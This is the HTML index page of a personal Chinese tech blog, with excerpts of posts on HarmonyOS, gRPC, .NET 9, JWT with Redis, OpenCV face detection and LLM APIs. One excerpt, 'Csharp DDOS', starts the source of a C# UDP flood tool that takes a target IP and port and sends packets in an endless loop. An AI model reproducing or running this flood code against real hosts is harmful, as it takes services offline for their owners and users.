<!doctype html><html lang=en dir=auto><head><meta name=generator content="Hugo 0.126.3"><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>MLOG</title>
<meta name=description content="A simple blog "><meta name=author content="dwd"><link rel=canonical href=https://qfsyso.github.io/><link crossorigin=anonymous href=/assets/css/stylesheet.f49d66caae9ea0fd43f21f29e71a8d3e284517ed770f2aa86fa012953ad3c9ef.css integrity="sha256-9J1myq6eoP1D8h8p5xqNPihFF+13Dyqob6ASlTrTye8=" rel="preload stylesheet" as=style><link rel=icon href=https://qfsyso.github.io/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://qfsyso.github.io/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://qfsyso.github.io/favicon-32x32.png><link rel=apple-touch-icon href=https://qfsyso.github.io/apple-touch-icon.png><link rel=mask-icon href=https://qfsyso.github.io/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate type=application/rss+xml href=https://qfsyso.github.io/index.xml><link rel=alternate type=application/json href=https://qfsyso.github.io/index.json><link rel=alternate hreflang=en href=https://qfsyso.github.io/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:url" content="https://qfsyso.github.io/"><meta property="og:site_name" content="MLOG"><meta property="og:title" content="MLOG"><meta property="og:description" content="A simple blog "><meta property="og:locale" content="zh-CN"><meta property="og:type" content="website"><meta name=twitter:card content="summary"><meta name=twitter:title content="MLOG"><meta name=twitter:description content="A simple blog "><script type=application/ld+json>{"@context":"https://schema.org","@type":"Organization","name":"MLOG","url":"https://qfsyso.github.io/","description":"A simple blog ","logo":"https://qfsyso.github.io/favicon.ico","sameAs":[]}</script></head><body class=list id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://qfsyso.github.io/ accesskey=h title="MLOG (Alt + H)">MLOG</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)" aria-label="Toggle theme"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=https://qfsyso.github.io/posts/ title=Archive><span>Archive</span></a></li><li><a href=https://qfsyso.github.io/tags/ title=Tags><span>Tags</span></a></li><li><a href=https://qfsyso.github.io/search/ title="Search (Alt + /)" accesskey=/><span>Search</span></a></li></ul></nav></header><main class=main><article class=post-entry><header class=entry-header><h2 class=entry-hint-parent>HarmonyOS Next Waste Sorting</h2></header><div class=entry-content><p>环境 DevEco Studio NEXT Beta1 Build Version: 5.0 API 13
Waste Sorting 垃圾分类
算法 //springCurve回弹 animateToImmediately({ duration:800, curve: curves.springCurve(0, 20, 90, 20), // 其他配置 }); 初始偏移量、振幅、周期和阻尼系数，通过这些参数可以控制动画的弹性效果
//Fisher-Yates洗牌 shuffleItems() { for (let i = this.garbageItems.length - 1; i > 0; i--) { const j = Math.floor(Math.random() * (i + 1)); let temp = this.garbageItems[i]; this.garbageItems[i] = this.garbageItems[j]; this.garbageItems[j] = temp; } } 代码 import { curves } from '@kit.ArkUI'; // 导入ArkUI工具包中的曲线模块 // 定义垃圾项目类 class GarbageItem { name: string; // 垃圾名称 type: number; // 垃圾类型 description?...</p></div><footer class=entry-footer><span title='2024-12-15 15:33:54 +0000 UTC'>December 15, 2024</span>&nbsp;·&nbsp;46 min&nbsp;·&nbsp;dwd</footer><a class=entry-link aria-label="post link to HarmonyOS Next Waste Sorting" href=https://qfsyso.github.io/posts/harmonyos-next-waste-sorting/></a></article><article class=post-entry><header class=entry-header><h2 class=entry-hint-parent>Csharp DDOS</h2></header><div class=entry-content><p>UDP 包发 using System; using System.Net; using System.Net.Sockets; using System.Text; using System.Threading; class Program { static void Main(string[] args) { Console.Clear(); Console.WriteLine("UDP Flood Attack"); Console.WriteLine(); // 获取目标 IP 和端口 Console.Write("IP Target : "); string ip = Console.ReadLine(); Console.Write("Port : "); int port = int.Parse(Console.ReadLine()); // 准备 UDP 客户端 UdpClient udpClient = new UdpClient(); byte[] bytes = new byte[1490]; new Random().NextBytes(bytes); // 生成随机字节数据 // 模拟进度条 Console.Clear(); Console.WriteLine("Attack Starting"); ShowProgressBar(); // 开始发送 UDP 数据包 int sent = 0; while (true) { try { udpClient....</p></div><footer class=entry-footer><span title='2024-12-11 21:19:04 +0000 UTC'>December 11, 2024</span>&nbsp;·&nbsp;6 min&nbsp;·&nbsp;dwd</footer><a class=entry-link aria-label="post link to Csharp DDOS" href=https://qfsyso.github.io/posts/csharp-ddos/></a></article><article class=post-entry><header class=entry-header><h2 class=entry-hint-parent>llama-3.3-70b-versatile</h2></header><div class=entry-content><p>llama-3.3-70b-versatile Groq API 免费使用教程 第一步：获取 API 访问 https://console.groq.com/ 完成注册并申请 API -> googlemail 保存获得的 API 密钥 第二步：配置 NextChat 打开 https://app.nextchat.dev/ https://github.com/ChatGPTNextWeb/ChatGPT-Next-Web 在左侧设置中填入： 设置->模型服务商->Google 设置->自定义接口
模型(model) llama-3.3-70b-versatile 接口地址：https://api.groq.com/openai/ API Key：填入之前获取的密钥 自定义模型：llama-3.3-70b-versatile 主要优势 响应速度：200 Token/秒 性能表现：接近 GPT-4.0 水平 完全免费使用 使用限制 每分钟限额：6000 Token 每日 API 调用：14000 次 足够普通用户日常使用 gsk_U2MI0vooKS4JyCtmNMLHWGdyxxxfqo
提问：你是什么大模型 回答： 我是人工智能模型，特别是一种大型语言模型。我的主要功能是理解和生成类似人类的文本。我的训练数据包括了大量的文本信息，这使我能够学习语言的模式和结构，并根据这个学习生成类似人类的回答。 我的能力包括但不限于： 回答问题：我可以根据我的训练数据回答广泛的题目，从科学和历史到娱乐和文化。 生成文本：我可以根据给定的提示或主题生成文本，包括文章、故事、诗歌等。 翻译：我可以进行语言之间的翻译，例如从英语翻译到西班牙语、法语、德语等。 摘要：我可以将长篇文本摘要为简短的摘要，帮助用户快速理解主要内容。 对话：我可以与用户进行对话，回答问题，提供信息，甚至参与辩论。 我的优势在于能够快速处理和生成大量信息，但是我的能力也受到训练数据的限制。因此，我可能无法总是提供完全准确或最新的信息。然而，我会尽力提供最好的答案和帮助。</p></div><footer class=entry-footer><span title='2024-12-10 22:32:02 +0000 UTC'>December 10, 2024</span>&nbsp;·&nbsp;1 min&nbsp;·&nbsp;dwd</footer><a class=entry-link aria-label="post link to llama-3.3-70b-versatile" href=https://qfsyso.github.io/posts/llama-3.3-70b-versatile/></a></article><article class=post-entry><header class=entry-header><h2 class=entry-hint-parent>gRPC</h2></header><div class=entry-content><p>gRPC（Google Remote Procedure Call） 是一个高性能、开源和通用的RPC框架，最初由Google开发。它使用HTTP/2作为传输协议，并默认采用Protocol Buffers作为接口定义语言（IDL）和消息格式。gRPC支持多种编程语言，包括但不限于C++、Java、Python、Go、Ruby、C#、Node.js、PHP等。
gRPC 特点： 高效的数据交换：通过使用Protocol Buffers（Protobuf），gRPC能够以二进制形式序列化和反序列化数据，这比JSON或XML等文本格式更紧凑、更快。 双向流式通信：gRPC支持四种不同的调用类型：简单RPC、服务器端流式RPC、客户端流式RPC以及双向流式RPC。这使得开发者可以灵活选择最适合其应用场景的通信模式。 HTTP/2：gRPC基于HTTP/2构建，这意味着它可以利用HTTP/2提供的特性，如多路复用、头部压缩、流量控制等，来提高性能和可靠性。 跨平台支持：gRPC可以在多种环境中运行，包括云服务、本地部署、移动端等，并且对各种编程语言都有良好的支持，便于构建跨平台的应用程序。 插件系统：gRPC提供了一个插件系统，允许用户自定义代码生成逻辑，或者添加额外的功能，如认证、日志记录、监控等。 强大的社区和生态系统：由于它是Google的产品并且被广泛采用，因此拥有一个活跃的社区和丰富的第三方库与工具生态系统。
gRPC 场景： gRPC的使用场景非常广泛，尤其适用于需要高效、可靠和高性能通信的应用程序。以下是gRPC的一些典型使用场景：
1. 微服务架构 服务间通信：在微服务架构中，不同的服务可能使用不同的编程语言实现，并且需要高效地相互交流。gRPC以其跨语言支持和高效的二进制协议（Protocol Buffers），成为构建微服务之间通信层的理想选择。 负载均衡：gRPC原生支持客户端负载均衡，可以帮助分散请求到多个服务实例上，提高系统的可用性和性能。
2. 实时应用程序 双向流式通信：gRPC的双向流特性非常适合用于实时应用程序，如聊天应用、在线游戏、视频会议等，其中客户端和服务端需要持续地交换数据。 实时数据推送：对于需要从服务器向客户端推送实时更新的应用，例如股票行情、社交媒体通知、物联网设备状态更新等，gRPC的服务端流式RPC可以有效地实现这一需求。
3. 移动应用与后端通信 轻量级性能：由于其高效的序列化机制和较低的网络开销，gRPC特别适合移动应用与后端服务器之间的通信，特别是在网络条件不佳的情况下，能够减少电量消耗并提高响应速度。 快速开发：gRPC自动生成客户端和服务端代码的能力，大大简化了开发流程，尤其是在多平台开发环境中，减少了重复劳动。
4. 跨语言通信 多语言环境：gRPC支持多种编程语言，使得它非常适合用于跨语言通信的场景。不同团队或项目可以使用各自熟悉的技术栈，同时通过gRPC进行无缝集成。 异构系统集成：当需要将遗留系统与现代应用集成时，gRPC的跨语言能力可以帮助桥接这些系统，促进信息的流动和交互。
5. 分布式系统 节点间通信：在分布式系统中，各节点之间的通信是至关重要的。gRPC提供的高效率和可靠性使其成为分布式计算、任务分发、集群管理等场景下的首选通信框架。 数据同步：gRPC可以用来实现实时的数据同步，确保分布式系统中的所有节点都拥有最新的数据副本。
6. 容器化环境 服务发现：在Kubernetes等容器编排平台上，gRPC可以通过服务发现机制自动找到其他服务，简化了容器间的通信配置。 轻量级部署：gRPC的轻量级特性和对多语言的支持，使其非常适合容器化部署，有助于提升资源利用率和服务扩展性。
7. API后端服务 高性能API：许多大型互联网公司使用gRPC来构建其API后端服务，因为它提供了高性能、可扩展性和易于维护的方式来处理客户端请求。 类型安全：gRPC的IDL（接口定义语言）定义了严格的服务契约，保证了服务端和客户端之间的调用是类型安全的，减少了运行时错误的发生。
8. 物联网（IoT） 低资源消耗：gRPC的高效性能和紧凑的消息格式，使得它成为连接IoT设备和传感器的理想通信协议，能够在有限的计算和网络资源下提供可靠的通信。 实时监控与控制：gRPC的流式API非常适合用于实时监控和控制IoT设备，如智能家居系统、工业自动化等场景。
9. 大数据和机器学习 数据传输：在大数据处理和机器学习训练过程中，gRPC可以用来高效地传输大量数据，特别是当数据需要在不同的计算节点之间传递时。 模型服务：gRPC常被用于构建机器学习模型的服务化接口，允许客户端以高效的方式查询模型预测结果。 综上所述，gRPC是一个灵活且强大的通信框架，适用于各种需要高效、可靠通信的场景。无论是构建复杂的微服务架构，还是简单的客户端-服务器应用，gRPC都能提供显著的优势。
Node.js gRPC 创建和调用 gRPC 服务。包括服务器和客户端实现。
1. 安装必要的包 在项目目录下执行以下命令安装 gRPC 相关依赖：
npm install @grpc/grpc-js @grpc/proto-loader 2....</p></div><footer class=entry-footer><span title='2024-12-09 23:18:09 +0000 UTC'>December 9, 2024</span>&nbsp;·&nbsp;3 min&nbsp;·&nbsp;dwd</footer><a class=entry-link aria-label="post link to gRPC" href=https://qfsyso.github.io/posts/grpc/></a></article><article class=post-entry><header class=entry-header><h2 class=entry-hint-parent>ASP.NET Core 9.0</h2></header><div class=entry-content><p>.net9 引入了扩展类型特性，允许开发者扩展实例成员、静态成员以及属性成员，打破了以往只能通过静态类定义扩展方法的限制；params 关键字不再局限于数组类型，可与多种集合类型一起使用；新增 System.Threading.Lock 类型用于线程同步，改进了线程同步机制；异常处理速度大幅提升，环路性能也有所提高，动态 PGO 降低了类型检查成本，RyuJIT 编译器内联更通用的方法以减少方法调用开销等. linq新增了 CountBy 和 AggregateBy 方法，可通过键进行状态聚合，无需通过 GroupBy 进行中间分组，提高了数据查询的效率和灵活性. 引入了 CryptographicOperations 类型中的新的一次性哈希方法，支持最新的加密标准，并新增了一些加密相关的 API；强化了安全机制，如引入更强大的身份验证和授权机制，支持 OAuth 2.0 和 OpenID Connect 等，还通过 AI 驱动的安全功能实现实时威胁检测
Debian 12 安装.NET 9 添加 Microsoft 包签名密钥和包存储库： 打开终端，运行以下命令：
wget https://packages.microsoft.com/config/debian/12/packages-microsoft-prod.deb -O packages-microsoft-prod.deb sudo dpkg -i packages-microsoft-prod.deb rm packages-microsoft-prod.deb 安装.NET SDK： 如果需要开发.NET 应用程序，可安装.NET SDK，运行以下命令：
sudo apt-get update && \ sudo apt-get install -y dotnet-sdk-9.0 安装.NET 运行时： 如果只需要运行.NET 应用程序，可安装.NET 运行时。建议安装ASP.NET Core 运行时，因为它包含了.NET 和ASP.NET Core 运行时，在终端中运行以下命令：...</p></div><footer class=entry-footer><span title='2024-12-05 21:56:25 +0000 UTC'>December 5, 2024</span>&nbsp;·&nbsp;1 min&nbsp;·&nbsp;dwd</footer><a class=entry-link aria-label="post link to ASP.NET Core 9.0" href=https://qfsyso.github.io/posts/asp.net-core-9.0/></a></article><article class=post-entry><header class=entry-header><h2 class=entry-hint-parent>Navigation</h2></header><div class=entry-content><p></p></div><footer class=entry-footer><span title='2024-12-04 19:31:51 +0000 UTC'>December 4, 2024</span>&nbsp;·&nbsp;0 min&nbsp;·&nbsp;dwd</footer><a class=entry-link aria-label="post link to  Navigation" href=https://qfsyso.github.io/posts/navigation/></a></article><article class=post-entry><header class=entry-header><h2 class=entry-hint-parent>jwt redis</h2></header><div class=entry-content><p>Redis JWT 在 .NET 中使用 Redis 来存储 JWT（JSON Web Token）可以通过多种方式实现， 例如在用户登录时将生成的 JWT 存储在 Redis 中以便于后续验证和管理。
实现步骤
引入依赖 确保你的项目引入了以下必要的 NuGet 包：
Microsoft.AspNetCore.Authentication.JwtBearer：用于 JWT 身份验证。 StackExchange.Redis：用于与 Redis 通信。
dotnet add package Microsoft.AspNetCore.Authentication.JwtBearer dotnet add package StackExchange.Redis 配置 Redis 客户端 设置 Redis 的连接和操作。
生成 JWT 根据用户信息生成 JWT 并将其存储到 Redis。
验证 JWT 在验证阶段从 Redis 检查 token 是否有效。
实现 Token 的失效机制 利用 Redis 的 TTL（过期时间）特性来管理 token 的生命周期。
代码实现 1. 配置 Redis 客户端 在 Program.cs 或 Startup....</p></div><footer class=entry-footer><span title='2024-12-03 01:20:03 +0000 UTC'>December 3, 2024</span>&nbsp;·&nbsp;6 min&nbsp;·&nbsp;dwd</footer><a class=entry-link aria-label="post link to jwt redis" href=https://qfsyso.github.io/posts/jwt-redis/></a></article><article class=post-entry><header class=entry-header><h2 class=entry-hint-parent>cashrp opencv</h2></header><div class=entry-content><p>Emgu CV进行基本的人脸检测。 人脸检测是指定位图像中的人脸位置，而人脸识别是指确认或验证这些脸孔的身份。为了实现人脸识别，需要训练一个模型，或者使用预训练的模型。
安装 Emgu CV 首先，需要通过NuGet安装Emgu CV包。可以通过Visual Studio的NuGet包管理器来安装：
打开的C#项目。 右键点击解决方案资源管理器中的项目名称，选择“管理NuGet程序包”。
搜索并安装Emgu.CV和Emgu.CV.runtime.windows。 // 加载人脸检测分类器 CascadeClassifier faceCascade = new CascadeClassifier("haarcascade_frontalface_default.xml"); // 读取输入图像 Image&lt;Bgr, byte> inputImage = new Image&lt;Bgr, byte>("face.jpg"); // 转换为灰度图像，因为人脸检测通常在灰度图像上进行 Image&lt;Gray, byte> grayImage = inputImage.Convert&lt;Gray, byte>(); // 进行人脸检测 Rectangle[] faces = faceCascade.DetectMultiScale(grayImage, 1.1, 3, Size.Empty); // 在检测到的人脸周围绘制矩形框 foreach (Rectangle face in faces) { inputImage.Draw(face, new Bgr(0, 255, 0), 3); } // 保存标记后的图像为output.jpg inputImage.Save("output.jpg"); Console.WriteLine("save~output.jpg"); xml来自 https://github.com/opencv/opencv/tree/master/data/haarcascades
runtime 如果没有 Emgu.CV.runtime.windows 则会加载不了xml...</p></div><footer class=entry-footer><span title='2024-12-03 01:15:38 +0000 UTC'>December 3, 2024</span>&nbsp;·&nbsp;1 min&nbsp;·&nbsp;dwd</footer><a class=entry-link aria-label="post link to cashrp opencv" href=https://qfsyso.github.io/posts/cashrp-opencv/></a></article><article class=post-entry><header class=entry-header><h2 class=entry-hint-parent>DeepSeek-V2.5</h2></header><div class=entry-content><p>DeepSeek-V2.5 在目前大模型主流榜单中，DeepSeek-V2.5 均表现出色
中文综合能力（AlignBench）位列开源榜首 与 GPT-4-Turbo，文心 4.0 等闭源模型在评测中处于同一梯队
英文综合能力（MT-Bench）处于第一梯队 英文综合能力（MT-Bench）与最强的开源模型 LLaMA3-70B 处于同一梯队，超过最强 MoE 开源模型 Mixtral8x22B
知识、数学、推理、编程等榜单结果位居前列 开源模型支持 128K 上下文
api curl https://api.deepseek.com/chat/completions \ -H "Content-Type: application/json" \ -H "Authorization: Bearer xx" \ -d '{ "model": "deepseek-chat", "messages": [ {"role": "system", "content": "You are a helpful assistant."}, {"role": "user", "content": "Hello!"} ], "stream": false }' py # Please install OpenAI SDK first: `pip3 install openai` from openai import OpenAI client = OpenAI(api_key="skx", base_url="https://api....</p></div><footer class=entry-footer><span title='2024-11-30 03:13:44 +0000 UTC'>November 30, 2024</span>&nbsp;·&nbsp;3 min&nbsp;·&nbsp;dwd</footer><a class=entry-link aria-label="post link to  DeepSeek-V2.5" href=https://qfsyso.github.io/posts/deepseek-v2.5/></a></article><article class=post-entry><header class=entry-header><h2 class=entry-hint-parent>packet splicing</h2></header><div class=entry-content><p>模拟粘包的场景 粘包通常在发送端因数据频繁写入缓冲区并一起发送，或者在接收端没有明确的分包逻辑导致读取不完整的数据包时发生。
使用固定分隔符或包头+包体 常见的解决粘包方案是使用分隔符（如 \n 或特殊字符），或采用固定的包头标识数据长度。
服务端代码
using System; using System.Net; using System.Net.Sockets; using System.Text; using System.Threading; class TcpServer { static void Main() { TcpListener listener = new TcpListener(IPAddress.Any, 5000); listener.Start(); Console.WriteLine("Server started, waiting for connection..."); Socket clientSocket = listener.AcceptSocket(); Console.WriteLine("Client connected!"); byte[] buffer = new byte[1024]; int bytesRead; while ((bytesRead = clientSocket.Receive(buffer)) > 0) { string receivedData = Encoding.UTF8.GetString(buffer, 0, bytesRead); Console.WriteLine($"Received: {receivedData}"); // 模拟数据未分包的场景 Console.WriteLine("Processing received data..."); string[] messages = receivedData....</p></div><footer class=entry-footer><span title='2024-11-27 22:46:43 +0000 UTC'>November 27, 2024</span>&nbsp;·&nbsp;2 min&nbsp;·&nbsp;dwd</footer><a class=entry-link aria-label="post link to packet splicing" href=https://qfsyso.github.io/posts/packet-splicing/></a></article><footer class=page-footer><nav class=pagination><a class=prev href=https://qfsyso.github.io/page/2/>«&nbsp;Prev&nbsp;
</a><a class=next href=https://qfsyso.github.io/page/4/>Next&nbsp;&nbsp;»</a></nav></footer></main><footer class=footer><div class=wtime><div class=wtime2>CST<span id=beijingTime></span> GMT <span id=londonTime></span> EST <span id=newYorkTime></span> PST<span id=losAngelesTime></span></div><div class=wtime2 style=display:none>东京<span id=tokyoTime></span></div><div class=wtime2 style=display:none>欧洲-巴黎<span id=parisTime></span></div><div class=wtime2 style=display:none>UTC<span id=utcTime></span></div></div><span>&copy; 2025 <a href=https://qfsyso.github.io/>MLOG</a></span> ·
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a>
</span><script type=text/javascript>const timeZoneOffsets={beijing:8,tokyo:9,paris:[1,2],london:[0,1],newYork:[-5,-4],losAngeles:[-8,-7]};function padZero(e){return e<10?"0"+e:e}function formatTime(e){const t=e.getFullYear(),n=padZero(e.getMonth()+1),s=padZero(e.getDate()),o=padZero(e.getHours()),i=padZero(e.getMinutes()),a=padZero(e.getSeconds());return`${t}-${n}-${s} ${o}:${i}:${a}`}function isDaylightSavingTime(e,t){const o=e.getMonth(),n=new Date(e.getFullYear(),3,8,2,0,0),s=new Date(e.getFullYear(),10,1,2,0,0);return(t==="paris"||t==="london"||t==="newYork"||t==="losAngeles")&&e>=n&&e<s}function updateTime(){const e=new Date,t=new Date(e.getUTCFullYear(),e.getUTCMonth(),e.getUTCDate(),e.getUTCHours(),e.getUTCMinutes(),e.getUTCSeconds()),n=formatTime(t);document.getElementById("utcTime").innerHTML=n;for(const n in timeZoneOffsets){const e=timeZoneOffsets[n];let s;Array.isArray(e)?s=isDaylightSavingTime(t,n)?e[1]:e[0]:s=e;const o=new Date(t.getTime()+s*60*60*1e3);document.getElementById(n+"Time").innerHTML=formatTime(o)}setTimeout(updateTime,1e3)}window.onload=function(){updateTime()};function notfound(e){var n=e.src,t=n.split("/"),s=t[t.length-1];e.src="https://47.115.223.75:8080/group1/v2/"+s+"?timestamp="+Date.now(),e.onerror=null}</script></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg>
</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script></body></html>